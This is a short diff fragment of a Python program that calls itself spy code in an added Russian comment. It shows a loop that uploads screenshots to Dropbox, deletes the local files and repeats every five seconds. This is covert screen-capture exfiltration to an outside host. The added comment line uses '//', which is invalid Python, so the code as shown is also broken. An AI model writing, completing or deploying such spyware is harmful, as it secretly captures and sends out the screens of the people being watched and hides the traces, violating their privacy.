@@ -29,4 +29,5 @@ while(True):
     upload_to_dropbox(screenshot_file)
     # Удаляем скриншот
     os.remove(screenshot_file)
-    time.sleep(5)   
+    time.sleep(5) 
+// привет это код для программы шпиона
